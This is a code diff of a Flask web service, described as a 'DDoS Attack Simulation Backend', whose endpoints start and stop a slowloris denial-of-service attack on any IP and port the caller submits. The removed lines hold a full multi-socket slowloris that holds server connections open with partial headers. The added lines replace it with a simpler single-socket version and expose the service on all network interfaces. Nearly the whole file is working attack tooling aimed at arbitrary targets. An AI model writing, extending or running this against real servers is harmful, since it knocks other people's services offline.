@@ -1,63 +1,58 @@
-from flask import Flask, render_template, request, jsonify
 import threading
-import socket
+from flask import Flask, request, jsonify
 import time
+import socket
 
 app = Flask(__name__)
+
+# Ensure stop_attack is initialized as a threading event
 stop_attack = threading.Event()
 
+# Define slowloris attack function (simplified version for testing)
 def slowloris_attack(ip, port):
-    sockets = []
     try:
-        for _ in range(200):  # Initialize multiple sockets
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(4)
-            s.connect((ip, port))
-            s.sendall(b"GET / HTTP/1.1\r\n")
-            s.sendall(b"Host: " + ip.encode() + b"\r\n")
-            s.sendall(b"Connection: keep-alive\r\n\r\n")
-            sockets.append(s)
-
+        # Create a socket and initiate a connection
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client.settimeout(10)
+        client.connect((ip, port))
+        
+        # Send data to keep the connection open
         while not stop_attack.is_set():
-            for s in sockets:
-                try:
-                    s.sendall(b"X-a: keep-alive\r\n")
-                except socket.error:
-                    sockets.remove(s)  # Remove dead sockets
-                    s.close()
-
-            time.sleep(10)  # Slow down the requests
+            client.send(b"GET / HTTP/1.1\r\n")
+            time.sleep(1)  # Slow down the request to simulate slowloris
+        client.close()
     except Exception as e:
-        print(f"Error during attack: {e}")
-    finally:
-        for s in sockets:
-            s.close()
+        print(f"Error in attack: {e}")
 
 @app.route('/')
 def index():
-    return render_template('index.html')
+    return 'DDoS Attack Simulation Backend is Running'
 
 @app.route('/start', methods=['POST'])
 def start_attack():
     global stop_attack
-    stop_attack.clear()
-
+    stop_attack.clear()  # Reset the stop_attack event to allow attack to start
+    
     ip = request.json.get('ip')
     port = int(request.json.get('port', 80))
 
     if not ip or not port:
         return jsonify({'status': 'error', 'message': 'IP and port are required'})
 
-    thread = threading.Thread(target=slowloris_attack, args=(ip, port))
-    thread.daemon = True
-    thread.start()
-    return jsonify({'status': 'success', 'message': 'Attack started'})
+    # Start the attack in a separate thread
+    try:
+        thread = threading.Thread(target=slowloris_attack, args=(ip, port))
+        thread.daemon = True
+        thread.start()
+        return jsonify({'status': 'success', 'message': 'Attack started'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)})
 
 @app.route('/stop', methods=['POST'])
-def stop_attack():
+def stop_attack_route():
     global stop_attack
-    stop_attack.set()
+    stop_attack.set()  # Stop the attack by setting the event
     return jsonify({'status': 'success', 'message': 'Attack stopped'})
 
-if __name__ == '__main__':
-    app.run(debug=True)
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=5000)
